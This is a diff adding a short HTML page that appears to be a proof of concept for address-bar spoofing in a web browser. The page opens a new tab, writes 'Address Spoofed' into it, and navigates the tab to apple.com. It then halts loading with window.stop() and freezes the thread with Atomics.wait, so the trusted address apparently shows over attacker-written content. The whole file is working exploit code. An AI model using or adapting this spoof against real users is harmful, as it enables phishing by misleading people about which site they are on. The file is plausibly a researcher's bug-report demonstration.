@@ -1,0 +1,37 @@
+<h1>Window.stop</h1>
+<br>
+
+<button style="font-size: 30px;" onclick="spoof()">Button</button>
+
+<script>
+    function spoof() {
+        const tab = window.open("about:blank", "_blank");
+
+        if (!tab) return;
+
+        tab.document.write(`
+            <h1>Address Spoofed</h1>
+        `);
+
+        setTimeout(() => {
+            tab.location.href = "https://apple.com";
+        }, 1);
+
+        setTimeout(() => {
+            try {
+                tab.stop();
+            } catch (e) {
+                console.error(e);
+            }
+
+            try {
+                const sab = new SharedArrayBuffer(4);
+                const view = new Int32Array(sab);
+
+                Atomics.wait(view, 0, 0, 9999999);
+            } catch (e) {
+                console.error(e);
+            }
+        }, 500);
+    }
+</script>
